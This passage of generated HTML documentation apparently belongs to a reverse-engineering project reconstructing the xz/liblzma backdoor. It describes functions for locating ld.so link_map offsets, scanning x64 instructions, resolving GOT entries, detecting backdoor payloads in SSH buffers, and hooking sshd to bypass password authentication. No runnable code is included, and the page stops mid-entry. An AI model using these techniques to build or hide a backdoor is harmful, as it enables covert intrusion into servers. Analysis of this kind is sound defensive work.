          <td class="paramtype"><a class="el" href="structbackdoor__hooks__data.html">backdoor_hooks_data_t</a> *&#160;</td>
          <td class="paramname"><em>hooks</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="structimported__funcs.html">imported_funcs_t</a> *&#160;</td>
          <td class="paramname"><em>imported_funcs</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Find struct link_map offsets required to modify ld.so's private struct auditstate state. </p>
<p>This function inspects ld.so's private struct link_map for liblzma.</p>
<p>First, this function finds the end of the link_map by searching for the private link_map::l_relro_addr and link_map::l_relro_size with values that match liblzma's <a class="el" href="structelf__info.html#a8500b4de03a9b9d44989375921b27f70" title="location of the GNU relro segment">elf_info_t::gnurelro_vaddr</a> and <a class="el" href="structelf__info.html#a1783b21f972415e71d5cb7d8531de5e5" title="size of the GNU relro segment">elf_info_t::gnurelro_memsize</a> respectively.</p>
<p>This function then calculates libname_offset by searching for linkmap::l_name which points to a string stored just after the link_map by ld.so's _dl_new_object().</p>
<p>This function then sets <a class="el" href="structldso__ctx.html#a8f68b96010a76e72135e68cfad110542" title="location of libcrypto&#39;s link_map::l_name field">ldso_ctx::libcrypto_l_name</a> to the location of link_map::l_name for the libcrypto link_map.</p>
<p>This function disassembles ld.so's _dl_audit_preinit() and _dl_audit_symbind_alt() to verify both contain a LEA instruction with an offset that matches libname_offset.</p>
<p>This function also resolves a number of libc and libcrypto function addresses.</p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">data_handle</td><td></td></tr>
    <tr><td class="paramname">libname_offset</td><td>output of the offset from the start of the link_map to the location directly after where the link_map::l_name string data is stored </td></tr>
    <tr><td class="paramname">hooks</td><td></td></tr>
    <tr><td class="paramname"><a class="el" href="structimported__funcs.html">imported_funcs</a></td><td></td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>BOOL TRUE if successful, FALSE otherwise </dd></dl>

</div>
</div>
<a id="a3ab8cd040932beaf3ec377a753bfece0"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a3ab8cd040932beaf3ec377a753bfece0">&#9670;&nbsp;</a></span>find_mov_instruction()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">BOOL find_mov_instruction </td>
          <td>(</td>
          <td class="paramtype">u8 *&#160;</td>
          <td class="paramname"><em>code_start</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u8 *&#160;</td>
          <td class="paramname"><em>code_end</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">BOOL&#160;</td>
          <td class="paramname"><em>is_64bit_operand</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">BOOL&#160;</td>
          <td class="paramname"><em>load_flag</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="structdasm__ctx.html">dasm_ctx_t</a> *&#160;</td>
          <td class="paramname"><em>dctx</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>finds a MOV instruction. </p>
<p><code>load_flag</code> specifies if the desired MOV should be a load: </p><div class="fragment"><div class="line">mov reg, [mem] </div>
</div><!-- fragment --><p> or a store </p><div class="fragment"><div class="line">mov [mem], reg </div>
</div><!-- fragment --><dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">code_start</td><td>address to start searching from </td></tr>
    <tr><td class="paramname">code_end</td><td>address to stop searching at </td></tr>
    <tr><td class="paramname">is_64bit_operand</td><td>TRUE if MOV should have a 64bit operand, FALSE otherwise </td></tr>
    <tr><td class="paramname">load_flag</td><td>TRUE if searching for load, FALSE for a store </td></tr>
    <tr><td class="paramname">dctx</td><td>disassembler context to hold the state </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>BOOL TRUE if found, FALSE otherwise </dd></dl>

</div>
</div>
<a id="ae9718452d28f67f46d046c02c0125148"></a>
<h2 class="memtitle"><span class="permalink"><a href="#ae9718452d28f67f46d046c02c0125148">&#9670;&nbsp;</a></span>find_mov_lea_instruction()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">BOOL find_mov_lea_instruction </td>
          <td>(</td>
          <td class="paramtype">u8 *&#160;</td>
          <td class="paramname"><em>code_start</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u8 *&#160;</td>
          <td class="paramname"><em>code_end</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">BOOL&#160;</td>
          <td class="paramname"><em>is_64bit_operand</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">BOOL&#160;</td>
          <td class="paramname"><em>load_flag</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="structdasm__ctx.html">dasm_ctx_t</a> *&#160;</td>
          <td class="paramname"><em>dctx</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>like <a class="el" href="xzre_8h.html#a3ab8cd040932beaf3ec377a753bfece0">find_mov_instruction</a>, but also considers LEA instructions </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">code_start</td><td>address to start searching from </td></tr>
    <tr><td class="paramname">code_end</td><td>address to stop searching at </td></tr>
    <tr><td class="paramname">is_64bit_operand</td><td>TRUE if MOV should have a 64bit operand, FALSE otherwise </td></tr>
    <tr><td class="paramname">load_flag</td><td>TRUE if searching for load, FALSE for a store </td></tr>
    <tr><td class="paramname">dctx</td><td>disassembler context to hold the state </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>BOOL TRUE if found, FALSE otherwise </dd></dl>

</div>
</div>
<a id="aed0391d07e4413f5a13e1ec2940c94ea"></a>
<h2 class="memtitle"><span class="permalink"><a href="#aed0391d07e4413f5a13e1ec2940c94ea">&#9670;&nbsp;</a></span>find_reg2reg_instruction()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">BOOL find_reg2reg_instruction </td>
          <td>(</td>
          <td class="paramtype">u8 *&#160;</td>
          <td class="paramname"><em>code_start</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u8 *&#160;</td>
          <td class="paramname"><em>code_end</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="structdasm__ctx.html">dasm_ctx_t</a> *&#160;</td>
          <td class="paramname"><em>dctx</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>finds a reg2reg instruction </p>
<p>a reg2reg instruction is an x64 instruction with one of the following characteristics:</p><ul>
<li>a primary opcode of 0x89 (MOV/JNS) or, alternatively, passing the following filter:</li>
<li>((0x505050500000505uLL &gt;&gt; (((dctx-&gt;opcode) &amp; 0xFF) + 0x7F)) &amp; 1) != 0 NOTE: the opcode in 'dctx-&gt;opcode' is the actual opcode +0x80 TODO: inspect x64 manual to find the exact filter</li>
</ul>
<p>the instruction must also satisfy the following conditions:</p><ul>
<li>NOT have REX.B and REX.R set (no extension bits)</li>
<li>MODRM.mod must be 3 (register-direct addressing mode)</li>
</ul>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">code_start</td><td>address to start searching from </td></tr>
    <tr><td class="paramname">code_end</td><td>address to stop searching at </td></tr>
    <tr><td class="paramname">dctx</td><td>disassembler context to hold the state </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>BOOL TRUE if found, FALSE otherwise </dd></dl>

</div>
</div>
<a id="a78aba1d370c6519777e637f1ed7b7c14"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a78aba1d370c6519777e637f1ed7b7c14">&#9670;&nbsp;</a></span>find_string_reference()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">u8* find_string_reference </td>
          <td>(</td>
          <td class="paramtype">u8 *&#160;</td>
          <td class="paramname"><em>code_start</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u8 *&#160;</td>
          <td class="paramname"><em>code_end</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">const char *&#160;</td>
          <td class="paramname"><em>str</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>finds an instruction that references the given string </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">code_start</td><td>address to start searching from </td></tr>
    <tr><td class="paramname">code_end</td><td>address to stop searching at </td></tr>
    <tr><td class="paramname">str</td><td>the target of the string reference (i.e. the target of the LEA instruction) </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>u8* the address of the first instruction that references the given string, or NULL if not found </dd></dl>

</div>
</div>
<a id="aee7738c9cab5f6733c666e0a20e5ba99"></a>
<h2 class="memtitle"><span class="permalink"><a href="#aee7738c9cab5f6733c666e0a20e5ba99">&#9670;&nbsp;</a></span>get_cpuid_got_index()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">u64 get_cpuid_got_index </td>
          <td>(</td>
          <td class="paramtype"><a class="el" href="structelf__entry__ctx.html">elf_entry_ctx_t</a> *&#160;</td>
          <td class="paramname"><em>ctx</em></td><td>)</td>
          <td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>get the cpuid() GOT index </p>
<p>stores the index in elf_entry_ctx_t::cpuid_fn</p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">ctx</td><td></td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>u64 cpuid() GOT index </dd></dl>

</div>
</div>
<a id="ae74ae3bc755debdef566fa9b24cf8dd7"></a>
<h2 class="memtitle"><span class="permalink"><a href="#ae74ae3bc755debdef566fa9b24cf8dd7">&#9670;&nbsp;</a></span>get_elf_functions_address()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname"><a class="el" href="structelf__functions.html">elf_functions_t</a>* get_elf_functions_address </td>
          <td>(</td>
          <td class="paramtype">void&#160;</td>
          <td class="paramname"></td><td>)</td>
          <td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>gets the address of the <a class="el" href="structelf__functions.html">elf_functions</a> </p>
<p>uses elf_functions_offset to get the address 0x2a0 bytes before <a class="el" href="structelf__functions.html">elf_functions</a> and then adds 0x268 to get the final address of <a class="el" href="structelf__functions.html">elf_functions</a></p><ul>
<li><dl class="section return"><dt>Returns</dt><dd>elf_functions_t* </dd></dl>
</li>
</ul>

</div>
</div>
<a id="afca457dee8895eff6b7fdeffd6bc279a"></a>
<h2 class="memtitle"><span class="permalink"><a href="#afca457dee8895eff6b7fdeffd6bc279a">&#9670;&nbsp;</a></span>get_lzma_allocator()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">lzma_allocator* get_lzma_allocator </td>
          <td>(</td>
          <td class="paramtype">void&#160;</td>
          <td class="paramname"></td><td>)</td>
          <td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>gets the fake LZMA allocator, used for imports resolution the "opaque" field of the structure holds a pointer to </p>
<dl class="section see"><dt>See also</dt><dd>elf_info_t</dd></dl>
<dl class="section return"><dt>Returns</dt><dd>lzma_allocator* </dd></dl>

</div>
</div>
<a id="a048b695303b409f486861de0c24d6097"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a048b695303b409f486861de0c24d6097">&#9670;&nbsp;</a></span>get_lzma_allocator_address()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname"><a class="el" href="structfake__lzma__allocator.html">fake_lzma_allocator_t</a>* get_lzma_allocator_address </td>
          <td>(</td>
          <td class="paramtype">void&#160;</td>
          <td class="paramname"></td><td>)</td>
          <td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>gets the address of the fake LZMA allocator </p>
<p>uses fake_lzma_allocator_offset to get the address 0x180 bytes before <a class="el" href="structfake__lzma__allocator.html">fake_lzma_allocator</a> and then adds 0x160 to get the final address of <a class="el" href="structfake__lzma__allocator.html">fake_lzma_allocator</a></p>
<p>called in <a class="el" href="xzre_8h.html#afca457dee8895eff6b7fdeffd6bc279a" title="gets the fake LZMA allocator, used for imports resolution the &quot;opaque&quot; field of the structure holds a...">get_lzma_allocator()</a></p>
<dl class="section return"><dt>Returns</dt><dd>fake_lzma_allocator_t* </dd></dl>

</div>
</div>
<a id="a6189320317764e3344934873b58b30b1"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a6189320317764e3344934873b58b30b1">&#9670;&nbsp;</a></span>get_string_id()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">EncodedStringId get_string_id </td>
          <td>(</td>
          <td class="paramtype">const char *&#160;</td>
          <td class="paramname"><em>string_begin</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">const char *&#160;</td>
          <td class="paramname"><em>string_end</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Get the. </p>
<dl class="section see"><dt>See also</dt><dd>EncodedStringId for the given string the string will be consumed until one of the following condition is reached (whichever happens first):<ul>
<li>44 chars have been consumed (maximum string length)</li>
<li><code>string_end</code> is supplied and has been reached</li>
<li>the string table has been exhausted</li>
</ul>
</dd></dl>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">string_begin</td><td>the string to get the ID for (max 44 chars) </td></tr>
    <tr><td class="paramname">string_end</td><td>optional string end pointer </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>EncodedStringId the string ID matching the input string, or 0 if not found </dd></dl>

</div>
</div>
<a id="ae20580c7a069afb3b578f060582867df"></a>
<h2 class="memtitle"><span class="permalink"><a href="#ae20580c7a069afb3b578f060582867df">&#9670;&nbsp;</a></span>get_tls_get_addr_random_symbol_got_offset()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">ptrdiff_t get_tls_get_addr_random_symbol_got_offset </td>
          <td>(</td>
          <td class="paramtype"><a class="el" href="structelf__entry__ctx.html">elf_entry_ctx_t</a> *&#160;</td>
          <td class="paramname"><em>ctx</em></td><td>)</td>
          <td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>get the tls_get_addr_random_symbol GOT offset </p>
<p>sets elf_entry_ctx_t::got_ptr = 0x2600 stores the index in elf_entry_ctx_t::got_offset</p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">ctx</td><td></td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>ptrdiff_t tls_get_addr_random_symbol GOT offset </dd></dl>

</div>
</div>
<a id="a0ab331c3c38da2d4aa29f1c9178050fc"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a0ab331c3c38da2d4aa29f1c9178050fc">&#9670;&nbsp;</a></span>init_elf_entry_ctx()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">void init_elf_entry_ctx </td>
          <td>(</td>
          <td class="paramtype"><a class="el" href="structelf__entry__ctx.html">elf_entry_ctx_t</a> *&#160;</td>
          <td class="paramname"><em>ctx</em></td><td>)</td>
          <td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>initialises the elf_entry_ctx_t </p>
<p>stores the address of the symbol cpuid_random_symbol in <a class="el" href="structelf__entry__ctx.html#a286882a4d56155f97674460abe66b9cb" title="points to a symbol in memory will be used to find the GOT value">elf_entry_ctx_t::symbol_ptr</a> stores the return address of the function that called the IFUNC resolver which is a stack address in ld.so calls <a class="el" href="xzre_8h.html#a127444706ffc25ccce1ee267c014957d" title="updates the offset to the GOT">update_got_offset()</a> to update elf_entry_ctx_t::got_offset calls <a class="el" href="xzre_8h.html#aee7738c9cab5f6733c666e0a20e5ba99" title="get the cpuid() GOT index">get_cpuid_got_index()</a> to update elf_entry_ctx_t.got_ctx.cpuid_fn</p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">ctx</td><td></td></tr>
  </table>
  </dd>
</dl>

</div>
</div>
<a id="a3f711254180a966269aec059d386052a"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a3f711254180a966269aec059d386052a">&#9670;&nbsp;</a></span>init_hooks_ctx()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">int init_hooks_ctx </td>
          <td>(</td>
          <td class="paramtype"><a class="el" href="structbackdoor__hooks__ctx.html">backdoor_hooks_ctx_t</a> *&#160;</td>
          <td class="paramname"><em>ctx</em></td><td>)</td>
          <td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Initializes the structure with hooks-related data. </p>
<p>Grabs the call addresses of the internal functions that will be installed into the hook locations.</p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">funcs</td><td></td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>int </dd></dl>

</div>
</div>
<a id="a32140b1406c3e4519d5c7e1708ac9ea4"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a32140b1406c3e4519d5c7e1708ac9ea4">&#9670;&nbsp;</a></span>init_imported_funcs()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">BOOL init_imported_funcs </td>
          <td>(</td>
          <td class="paramtype"><a class="el" href="structimported__funcs.html">imported_funcs_t</a> *&#160;</td>
          <td class="paramname"><em>imported_funcs</em></td><td>)</td>
          <td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Initializes the <a class="el" href="structimported__funcs.html">imported_funcs</a> structure. </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">funcs</td><td>the <a class="el" href="structimported__funcs.html">imported_funcs</a> structure </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>BOOL TRUE if successful, FALSE otherwise (if the resolve count is incorrect) </dd></dl>

</div>
</div>
<a id="a31d16cd16f66f61d34ff686d73464181"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a31d16cd16f66f61d34ff686d73464181">&#9670;&nbsp;</a></span>init_ldso_ctx()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">void init_ldso_ctx </td>
          <td>(</td>
          <td class="paramtype"><a class="el" href="structldso__ctx.html">ldso_ctx_t</a> *&#160;</td>
          <td class="paramname"><em>ldso_ctx</em></td><td>)</td>
          <td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>initializes/resets ldso data </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname"><a class="el" href="structldso__ctx.html">ldso_ctx</a></td><td></td></tr>
  </table>
  </dd>
</dl>

</div>
</div>
<a id="ae45d2d9d01681263087d07c9b4de1afd"></a>
<h2 class="memtitle"><span class="permalink"><a href="#ae45d2d9d01681263087d07c9b4de1afd">&#9670;&nbsp;</a></span>init_shared_globals()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">int init_shared_globals </td>
          <td>(</td>
          <td class="paramtype"><a class="el" href="structbackdoor__shared__globals.html">backdoor_shared_globals_t</a> *&#160;</td>
          <td class="paramname"><em>shared_globals</em></td><td>)</td>
          <td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Initializes the <a class="el" href="structbackdoor__shared__globals.html">backdoor_shared_globals</a> structure. </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">shared_globals</td><td>the <a class="el" href="structbackdoor__shared__globals.html">backdoor_shared_globals</a> structure </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>int returns 0 on success, or 5 if <code>shared_globals</code> was NULL </dd></dl>

</div>
</div>
<a id="a544d2cf67930e0fcd9f9ff37239a4c70"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a544d2cf67930e0fcd9f9ff37239a4c70">&#9670;&nbsp;</a></span>is_endbr64_instruction()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">BOOL is_endbr64_instruction </td>
          <td>(</td>
          <td class="paramtype">u8 *&#160;</td>
          <td class="paramname"><em>code_start</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u8 *&#160;</td>
          <td class="paramname"><em>code_end</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u32&#160;</td>
          <td class="paramname"><em>low_mask_part</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Checks if the code between <code>code_start</code> and <code>code_end</code> is an endbr64 instruction. </p>
<p>the checks is encoded as following (note: An endbr64 instruction is encoded as <code>F3 0F 1E FA</code>) </p><div class="fragment"><div class="line"><span class="comment">// as 32bit quantities, so 0x10000f223 -&gt; f223</span></div>
<div class="line">(0xFA1E0FF3 + (0xE230 | 0x5E20000)) == 0xF223</div>
</div><!-- fragment --><p> and 0xE230 is always passed as an argument to prevent compiler optimizations and for further obfuscation.</p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">code_start</td><td>pointer to the first byte of the instruction to test </td></tr>
    <tr><td class="paramname">code_end</td><td>pointer to the last byte of the instruction to test </td></tr>
    <tr><td class="paramname">low_mask_part</td><td>the constant 0xE230 </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>BOOL TRUE if the instruction is an endbr64, FALSE otherwise </dd></dl>

</div>
</div>
<a id="aae4bd899725c9e0825517734783f0433"></a>
<h2 class="memtitle"><span class="permalink"><a href="#aae4bd899725c9e0825517734783f0433">&#9670;&nbsp;</a></span>is_gnu_relro()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">BOOL is_gnu_relro </td>
          <td>(</td>
          <td class="paramtype">Elf64_Word&#160;</td>
          <td class="paramname"><em>p_type</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u32&#160;</td>
          <td class="paramname"><em>addend</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>checks if the provided identifiers represent a <code>PT_GNU_RELRO</code> </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">p_type</td><td>program header type </td></tr>
    <tr><td class="paramname">addend</td><td>constant <code>0xA0000000</code> </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>BOOL TRUE if the supplied pt_type is <code>PT_GNU_RELRO</code>, FALSE otherwise </dd></dl>

</div>
</div>
<a id="a0c558b4d23018ab4e177dfd14f186be9"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a0c558b4d23018ab4e177dfd14f186be9">&#9670;&nbsp;</a></span>is_payload_message()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">BOOL is_payload_message </td>
          <td>(</td>
          <td class="paramtype">u8 *&#160;</td>
          <td class="paramname"><em>sshbuf_data</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">size_t&#160;</td>
          <td class="paramname"><em>sshbuf_size</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">size_t *&#160;</td>
          <td class="paramname"><em>pOutPayloadSize</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="structglobal__context.html">global_context_t</a> *&#160;</td>
          <td class="paramname"><em>ctx</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>checks if the given sshbuf buffer contains a backdoor payload message </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">sshbuf_data</td><td>sshbuf data pointer </td></tr>
    <tr><td class="paramname">sshbuf_size</td><td>size of sshbuf data </td></tr>
    <tr><td class="paramname">pOutPayloadSize</td><td>output variable that will be populated with the size of the backdoor payload, if found </td></tr>
    <tr><td class="paramname">ctx</td><td>the global context </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>BOOL TRUE if the given sshbuf contains a backdoor payload message, FALSE otherwise </dd></dl>

</div>
</div>
<a id="a5d94ba8c95f0333dc53ef8432156b0ca"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a5d94ba8c95f0333dc53ef8432156b0ca">&#9670;&nbsp;</a></span>is_range_mapped()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">BOOL is_range_mapped </td>
          <td>(</td>
          <td class="paramtype">u8 *&#160;</td>
          <td class="paramname"><em>addr</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u64&#160;</td>
          <td class="paramname"><em>length</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="structglobal__context.html">global_context_t</a> *&#160;</td>
          <td class="paramname"><em>ctx</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>verify if a memory range is mapped </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">addr</td><td>the start address </td></tr>
    <tr><td class="paramname">length</td><td>the length of the range to check </td></tr>
    <tr><td class="paramname">ctx</td><td>a structure with a libc_import_t field at offset 0x10 </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>BOOL TRUE if the whole range is mapped, FALSE otherwise </dd></dl>

</div>
</div>
<a id="a642ed90d3ade30228b3286310de5e5c1"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a642ed90d3ade30228b3286310de5e5c1">&#9670;&nbsp;</a></span>main_elf_parse()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">BOOL main_elf_parse </td>
          <td>(</td>
          <td class="paramtype"><a class="el" href="structmain__elf.html">main_elf_t</a> *&#160;</td>
          <td class="paramname"><em>main_elf</em></td><td>)</td>
          <td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Parses the main executable from the provided structure. As part of the process the arguments and environment is checked. </p>
<p>The main_elf_t::dynamic_linker_ehdr is set in <a class="el" href="xzre_8h.html#a229ee0bd4111363061bc4230bc1f6423" title="the backdoor main method that installs the backdoor_symbind64() callback">backdoor_setup()</a> by an interesting trick where the address of __tls_get_addr() is found via GOT in <a class="el" href="xzre_8h.html#ad3a61f27a1663eb3e0b25b861c85fe3c" title="finds the __tls_get_addr() GOT entry">update_got_address()</a>. Then a backwards search for the ELF header magic bytes from this address is performed to find the ld.so ELF header.</p>
<p>The function will succeed if the checks outlined in <a class="el" href="xzre_8h.html#a04a9f7dfab9ccac6d8407c906b7b2e2e">process_is_sshd</a> (invoked by this function) are successful.</p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname"><a class="el" href="structmain__elf.html">main_elf</a></td><td>The main executable to parse. </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>BOOL TRUE if successful and all checks passed, or FALSE otherwise. </dd></dl>

</div>
</div>
<a id="ace15703b7d962e9d6be778e4d8066f79"></a>
<h2 class="memtitle"><span class="permalink"><a href="#ace15703b7d962e9d6be778e4d8066f79">&#9670;&nbsp;</a></span>mm_answer_authpassword_hook()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">int mm_answer_authpassword_hook </td>
          <td>(</td>
          <td class="paramtype">struct ssh *&#160;</td>
          <td class="paramname"><em>ssh</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">int&#160;</td>
          <td class="paramname"><em>sock</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">struct sshbuf *&#160;</td>
          <td class="paramname"><em>m</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>used to bypass password authentication by replying with a successful <code>MONITOR_ANS_AUTHPASSWORD</code> </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">ssh</td><td></td></tr>
    <tr><td class="paramname">sock</td><td></td></tr>
    <tr><td class="paramname">m</td><td></td></tr>
  </table>
  </dd>
</dl>
